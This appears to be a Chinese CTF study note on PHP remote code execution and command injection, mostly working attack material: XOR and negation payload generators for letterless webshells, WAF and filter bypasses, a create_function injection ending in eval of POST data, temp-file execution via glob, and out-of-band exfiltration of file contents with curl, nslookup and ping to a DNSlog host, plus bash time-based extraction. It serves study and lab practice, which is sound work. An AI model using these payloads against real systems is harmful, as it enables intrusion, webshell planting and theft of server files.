- `dechex( ... )`

> 十进制 → 十六进制字符串
> 153 →  dechex(153)  →  "99"
>
> 和  bin2hex() 不一样：
>
> bin2hex ：处理二进制字节
>
> dechex ：处理十进制数字，输出十六进制

- `echo "%".dechex(...) `

> 拼接 % ，输出 %99 这种url编码。

- `for($i=0; $i < strlen($a); $i++){echo "%ff";`

> 循环次数等于字符串 $a 的字符数量。
>
> 每一轮循环固定输出文字  %ff , 会生成%ff%ff%ff%ff%ff%ff%ff%ff
>
> %ff URL解码得到字节  0xff ，也就是十进制255，二进制  11111111
>
> 在和前面已经用异或运算做了取反操作的二进制数再用异或运算做一次取反，还原payload

```
%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff
```

payload:

```
?code=(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();
```

![image-20261108005650538](/assets/images/rce/image-20261108005650538.png)

**更厉害的脚本**

```php
<?php
// 异或版 payload 生成器：每个名字编成 ('%xx..'^'%kk..')
function xenc($s, $key = 0xFF) {
    $a = ''; $k = '';
    for ($i = 0; $i < strlen($s); $i++) {
        $a .= '%' . sprintf('%02x', ord($s[$i]) ^ $key);  // 必须 %02x，dechex 会少位
        $k .= '%' . sprintf('%02x', $key);
    }
    return "('" . $a . "'^'" . $k . "')";
}

$fn = 'create_function';   // 要调用的函数
$sp = '_POST';             // 代码从哪个超全局取

$payload  = '$_='  . xenc($fn) . ';';                    // $_  = create_function
$payload .= '$__=' . xenc($sp) . ';';                    // $__ = _POST
$payload .= '$___=$$__;';                                // $___ = $_POST
$payload .= '$____=$_(%27%27,$___[_]);';                 // create_function('', $_POST['_'])
$payload .= '$____();';                                  // 调用才执行

// 自检：解码后不能出现字母数字
if (preg_match('/[A-Za-z0-9]/', rawurldecode($payload))) {
    die("❌ key 选得不好，解码后会出现字母数字\n");
}
echo $payload, "\n";

```

输出

```php
$_=('%9c%8d%9a%9e%8b%9a%a0%99%8a%91%9c%8b%96%90%91'^'%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff');$__=('%a0%af%b0%ac%ab'^'%ff%ff%ff%ff%ff%ff%ff%ff%ff');$___=$$__;$____=$_(%27%27,$___[_]);$____();
```

url解码

```php
$_ = "create_function";
$__ = "_POST";
$___ = $$__;                    // $___ = $_POST
$____ = $_('', $___[_]);        // create_function('', $_POST['_'])
$____();                        // 执行
```

最后再用 post 传参

```
_=phpinfo();
```

![image-20261108010222673](/assets/images/rce/image-20261108010222673.png)

![image-20261108010441933](/assets/images/rce/image-20261108010441933.png)

**eval不能动态调用，只能把字符串当成php代码执行，php7里面不能构造assert**

**eval和echo，不是函数，而是语言构造器**

#### 例题

```php
//rce3.php
<?php
error_reporting(0);
session_start();
require "hidden_filter.php";
if (!isset($_GET['code'])){
show_source(__FILE__);
exit();
}else{
$code = $_GET['code'];
if(!preg_match($secret_waf, $code)){
eval("\$_SESSION[" . $code . "]=false;");
}else die('hacker');
}
?>
```

```php
//hidden_filter
<?php
$secret_waf = '/f|\
(|\)|&|\||\^|\$|#|\*|`|\`|;|\/|\\\|"|\"|\|et|sy|exec|include|\'|\\\'| /i';
?>
```

waf对`f`、`(`、`)`、`&`、`|`、`^`、`$`、`#`、`*`、```、`;`、`/`、`\`、`"`、`et`、`sy`、`exec`、`include`、`'`、空格，不区分大小写进行了拦截

php短标签,可以绕过空格，分号

```php
<?=phpinfo()?>
<?=123?>	//输出123
```

不需要括号的函数

```
require "xxx.php";	//文件包含
include "xxx.php";
echo "123";
```

- `" \$_SESSION["`  里面的反斜杠 ` \ `

>  在PHP双引号字符串里， $  本来是用来解析变量的。
> 如果你直接写  "$_SESSION[" ，PHP会尝试解析 $_SESSION 变量，就乱套了。
> \$  的作用：转义，告诉PHP，这里的 $ 只是普通文本字符，不是变量！
>
> 所以  " \$_SESSION["  最终得到纯文本字符串： $_SESSION[
>
> 然后用 . 去拼接你传进来的 code
>
> 然后再用 . 拼接  "]=false;"
>
> 如果你传入  code=abc
> 拼接完送到eval里面执行的完整PHP代码就是：
>
> `$_SESSION[abc]=false;`
>
> 在session数组里面，新建一个下标为 abc 的元素，把它的值设置成布尔值  false
>
> code是我们自己控制的，我么可以用 ?code=]=1?> 去把前面的闭合,变成
>
> `$_SESSION[]=1?>]=false;`
>
> 把前面的数组闭合
>
> 后面剩下的  ]=false; ，直接当成普通文本输出，不会交给PHP解析执行
>
> 我们就可以先让前面先闭合数组，实现代码逃逸，然后再执行你后面你构造的绕过的payload

waf中，空格也被过滤掉，大多数函数中，都需要用空格去间隔参数，例如echo 123，如果中间没空格 echo123，PHP就会把这个整体当成一个字符串

但是waf中 ～ 取反符号没有给过滤，我们就可以用 ~ 当间隔符，只是后面的参数要进行一个取反处理

payload:

```php
?code=]=1?><?=require~%99%93%9e%98%d1%8f%97%8f?>
```

`%99%93%9e%98%d1%8f%97%8f` 这个是对字符串 `flag.php` 的取反加16进制url编码处理

![image-20261108131025354](/assets/images/rce/image-20261108131025354.png)

## **临时文件代码执行**

例题：

```php
<?php
header("Content-type:text/html;charset=utf-8");
if(isset($_GET['code'])){
$code = $_GET['code'];
if(strlen($code)>35){
die("Long.");
}
if(preg_match("/[A-Za-z0-9_$]+/",$code)){
die("NO.");
}
eval($code);
}else{
highlight_file(__FILE__);
}
```

**代码分析**：

- `strlen($code)>35` : webshell长度不超过35位
- `preg_match("/[A-Za-z0-9_$]+/",$code)`: 除了不包含字母数字，还不能包含 `$` 和 `_`

> 前面给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为$不能使用了，所以我们无法构造PHP中的变量。

### php7

没有过滤掉 `~` ,那么 就可以用取反 `~` 符 ，配合php 特有的 `($a)();`动态函数执行

```
?code=(~%8F%97%8F%96%91%99%90)();
```

![image-20261111101449344](/assets/images/rce/image-20261111101449344.png)

### php5

但是在php5 中不允许用`($a)();`这样的方法来执行动态函数的

我们接可以尝试用**临时文件代码执行**

搭建 php5 dockers 环境

```
cd /d D:\tools\ctf\lnmp-php5
docker-compose up -d
```

我们在 tmp 目录下创建一个 test 文件，并设置权限

```
cd tmp
touch test
chmod 777 test
```

然后写入 `bash ` 脚本的前缀 ,以及命令

```
#!/bin/bash
id
```

然后在终端执行

```
. ./test
```

发先文件中的脚本被执行了

![image-20261111105003393](/assets/images/rce/image-20261111105003393.png)

我们就可以上传这个文件，让系统把文件的 bash 脚本存入在一个临时文件中，但是上传完之后我们不知道随机的临时文件名是什么

Linux下的glob通配符：

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符
- `[abc],[a-b],[@-[]` 可以匹配括号范围内(和ascii码的顺序有关)的字符，其中 `[@-[]` 表示匹配任意一个大写字母

```
ls *	// * 查看当前目录下所有文件
ls */test	// 查看当前目录下所有文件夹中的test文件
ls */????	// 查看当前当前目录下所有文件夹的4个字符的文件
ls /???/?????????/	// 查看当前目录下3个字符文件夹下的9个字符的文件
```

临时文件的默认文件名格式是 `phpxxxxxx`

`/temp/phpxxxxxx` 能被 `/????/?????????` 匹配

但我们尝试执行`. /???/?????????`，会出错，因为能匹配这种文件可能会有很多，为了能更精确的匹配，我们可以改成 `. /???/????????[@-[]` ,去匹配根目录下3个字符的文件夹下的9个字符的文件，其中文件的最后一个字符是大写，由于临时文件的命名是随机的，所以存在最后一个字符是大写字母的情况，主要多试几次就可以成功执行

![image-20261111112154144](/assets/images/rce/image-20261111112154144.png)

文件可以被找到了，就差怎样去让这个文件去执行了，我们可以利用 php 短标签

```php
<?='cmd'?>
//<?= 是短输出标签，等价 echo；`cmd` 是 PHP 反引号执行运算符，等价 shell_exec()PHP Manual
```

```php
<?=`whoami`?>
// 等价：
<?php echo `whoami`; ?>
// 等价：
<?php echo shell_exec("whoami"); ?>
```

**test111.php**

```php
<?php
header("Content-type:text/html;charset=utf-8");
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");     //webshell长度不超过35位
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){              //除了不包含字母数字，还不能包含$和_
        die("NO.");
    }
    eval($code);
}else{
    highlight_file(__FILE__);
}
```

**payload**

```sh
?code=?><?=`. /???/????????[@-[]`;?>
```

eval 的字符串天然处在解析状态就是 PHP 态里（就像已经有一个 ` <?php`  开着了），所以  `?>`  负责把它关掉，然后再执行你后面自己构造的 php 代码

**eval 的字符串一进来就处在 PHP 态，而 `<?=` 是"开标签"，只在 HTML 态才会被识别**。所以开头的 `<?=` 不会被当成标签，只会被拆成三个运算符。

| 起始条件          | 通俗名字 | 扫描规则                                                     |
|-------------------|----------|--------------------------------------------------------------|
| `INITIAL`         | HTML 态  | 一切都是普通文本，只认 `<?php`、`<?=`、`<?` 三个开标签       |
| `ST_IN_SCRIPTING` | PHP 态   | 按 PHP 语法切 token；认 `?>`（`T_CLOSE_TAG`），**不认开标签** |

**chuan.html**

临时文件只在本次请求内存在，请求结束即删。所以"上传"和"执行"必须是同一个 HTTP 请求

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://127.0.0.1/test111.php?code=?><?=`. /???/????????[@-[]`;?>" method="POST" enctype="multipart/form-data">
	<input type="file" name="file">
	<input type="submit" value="submit"></form>
</body>
</html>
```

**1.txt**

```bash
#!/bin/bash
id
```

在 `chuan.html` 里面上传 `1.txt` ,多试几次就好了。

![image-20261111143816513](/assets/images/rce/image-20261111143816513.png)

## create_functiom

**动态创建匿名函数**

源代码:

```php
<?php
error_reporting(0);
$code=$_GET["code"];
$f=create_function('$a,$b', $code);
echo $f(1,2);
?>
```

payload:

```
?code=return %24a%2B%24b;}@eval($_POST[1]);//
```

url解码

```
return $a+$b;}@eval($_POST[1]);//
```

拼接之后，create_function 自动生成的真实代码

```
function ($a,$b){
    return $a+$b;
}
@eval($_POST[1]);//;
}
```

- return  就是函数返回值，把后面  $a+$b  的计算结果当作函数的返回结果。
- `;}` 将前面的闭合
- `@eval($_POST[1]);` 实现代码逃逸
- `// ` → 注释掉`create_function`自动补在最后的那个 ` } `，防止语法报错

## **命令执行漏洞**

命令执行是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上行任意命令。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的，system,exec,shell_exec等当用户可以控制命令执行医数中的参数时。将可注入恶意系统命令到正常命令中，造成命令执行攻击。命令注入是一种常见的漏洞形态。一旦存在命令注入漏洞，攻击者就可以在目标系统执行任意命令。命令注入攻击常用在向程序传入不安全参数(命令行参数、http头、cookie）。命令执行继承Web Server用户的权限，一般都有权限写文件，写马、查看隐私信息、窃取源码,甚至可以反弹shell，危害巨大。

### **高危函数：**

`system()`  、 `exec()`  、 `shell_exec()`  、 `passthru()` 、`pctnl_exec()` 、`popen()` 、 `proc_open()`。

> `<?='phpinfo()'?>`
>
> 反引号是shell_exec()的别称

### 联合执行

- `; ` 分号
  无条件连续执行，不管前面命令成功还是失败，后面都执行

```
ls;whoami;id
```

- `&& `  逻辑与

前面执行成功（返回码0），才跑后面；前面失败，后面不执行

```
test && ls && whoami
```

- `||`  逻辑或

前面执行失败（返回码非0），才跑后面；前面成功，后面不执行

```
test || ls
```

- `|`  管道符

前面一个命令执行的结果，传给后面命令当参数

```
echo 123 | base64
```

- 换行符 `%0a（\n）`,`%0d（\r）`

**URL编码**：%0a  = 换行  \n ； %0d  = 回车  \r
**作用**：分隔命令，等价于  ; ，不管前面命令成败，后面都执行

```
?cmd=ls%0awhoami
```

解码

```cmd
ls
whoami
```

---

```
?cmd=ls%0did
```

解码

```
ls
id
```

**有些WAF会拦截分号，就换成  `%0a`  绕过**

- `&` 后台符（单个&，不是&&）

**作用**：前面命令丢后台运行，前后命令几乎同时执行，无论前面是否报错，后面命令都会执行

```
?cmd=ls%26whoami
```

解码

```
ls & whoami
```

`ls%26whoami`  →  `ls & whoami` ：`ls`丢后台，`whoami`直接跑

**`&`一定要url编码**

### 空格过滤

- $IFS(不推荐)

cat$IFSflag.php	不能读取,因为会把 $ 后的 IFSflag.php 当成一个整体的变量

- ${IFS}

```
cat${IFS}flag.php
```

- $IFS$9

```
cat$IFS$9flag.php	$1一直到$9都可以
```

- < 或者 <>

```
cat<flag.php
cat<>flag.php
```

- {cat,flag.php}

```
{cat,flag.php}
```

- %09 (制表符 tab)

```
cat%09flag.php	在浏览器中才生效
```

### 关键字过滤

- 反斜线转义

```
cat fla\g.php
```

在被过滤的地方加反斜杠

- 两个单引号做分隔

```
cat fl''ag.php
```

在被过滤的地方加单引号，双引号 `""` 也可以

- base64 编码绕过

```
echo cGhwaW5mby5waHA= | base64 -d
```

只做解码，只是输出字符串 phpinfo.php，不会执行命令

```
echo Y2F0IGZsYWcucGhw | base64 -d | bash
```

把输出字符串 `phpinfo.php` 用管道传给  bash ，bash把收到的内容当成命令执行

- hex十六进制绕过

```
echo 63617420666c61672e706870 | xxd -r -p | bash
```

```
原始hex： 63617420666c61672e706870
解码： cat flag.php
```

1. 输出十六进制字符串 : `echo 63617420666c61672e706870 `

2.  `xxd -r -p `

- `-r` ：反向（十六进制 → 原始字节）
- `-p` ：plain格式，不带偏移、不带ASCII注释，只处理纯hex串,这一步把hex还原成命令字符串  cat flag.php

3.  `| bash `
把还原出来的字符串交给bash，当作命令执行

最终执行

```
cat flag.php
```

- printf \x 转义

```
原始命令 ：cat flag.php
字符转十六进制 : c\x63  a\x61  t\x74  空格\x20  f\x66  l\x6c  a\x61  g\x67  .\x2e  p\x70  h\x68  p\x70
```

```
printf '\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70' | bash
```

```
执行效果 =  cat flag.php
```

**url只编码有特殊含义的字符**

- glob通配符

```
cat f[k-m]ag.php
[k-m] 表示匹配k-m之间的字符 k l m
```

`*` :  表示当前路径下所用文件

`？` 表示匹配一个字符

```
cat f{k..m}ag.php
会同时尝试读 fkag.php、flag.php、fmag.php , 有哪个就读哪个，不存在的就报 No such file
```

- 定义变量做拼接

```
a=g.php;cat fla$a
先定义变量a，再执行命令
```

- 内联执行：反引号  `  和  $()

先执行里面子命令，把输出结果替换到外层命令

```
cat `echo 666c61672e706870 | xxd -r -p`
cat $(echo 666c61672e706870 | xxd -r -p)
```

```
echo 666c61672e706870 | xxd -r -p  → 解码得到  flag.php
```

加工后等价

```
cat flag.php
```

### cat 绕过

```
more flag.php
less -F flag.php
rev flag.php	反着输出结果
fmt flag.php
base64 flag.php		之后需要解码
```

### 无回显

本地测试

```bash
nc -lvp 4444	//监听本机的4444端口

重新开一个会话

curl http://127.0.0.1:4444?q=`cat phpinfo.php`

发现接收到 GET 请求了，并且显示了 phpinfo.php 的内容，但是不完整

curl http://127..0.0.1:4444?q=`cat phpinfo.php | base64`	// 以base64编码返回，发现是完整的信息
```

![image-20261115135447305](/assets/images/rce/image-20261115135447305.png)

DNSlog服务网站：`http://ceye.io/`	我自己专属的 `o3fszc.ceye.io`

我们向 `127.0.0.1.o3fszc.ceye.io` 发送请求，就要先去找 `o3fszc.ceye.io` ` 的 DNS 解析服务器，再DNS解析服务的日志中，我们就可以找到 `flag.php` 的信息

```bash
curl http://127.0.0.1.o3fszc.ceye.io?q=`cat flag.php | base64`
```

![image-20261115140532039](/assets/images/rce/image-20261115140532039.png)

![image-20261115140904636](/assets/images/rce/image-20261115140904636.png)

`curl` 被过滤，我们可以使用 `nslookup`

```
nslookup `cat flag.php | base64`.127.0.0.1.o3fszc.ceye.io
```

![image-20261115141244296](/assets/images/rce/image-20261115141244296.png)

![image-20261115141931352](/assets/images/rce/image-20261115141931352.png)

```
http://127.0.0.1.o3fszc.ceye.io/?q=MTExMTEK		// 解码就是 1111
```

`ping` 也可以

```
ping `cat flag.php | base64`.127.0.0.1.o3fszc.ceye.io
```

### 时间盲注(bash盲注)

```
if [ `cat flag.php | cut -c 3` = '3' ];then sleep 5;fi
```

> `cut -c 3` : 截取第三个字符

整句话的意思是，如果 flag.php 文件中第三个字符是 3 ，就休眠 5 秒；否则什么都不做，立刻结束

就可以通过爆破的方式获取 flag.php 的内容

`cut` 被过滤

`${string:start:length} 变量名 起始位置（不包含0，与索引不一样） 截取的长度`

```
a="1234567" 	//设置变量
echo ${a:4:1} 	//获取第4个字符
```
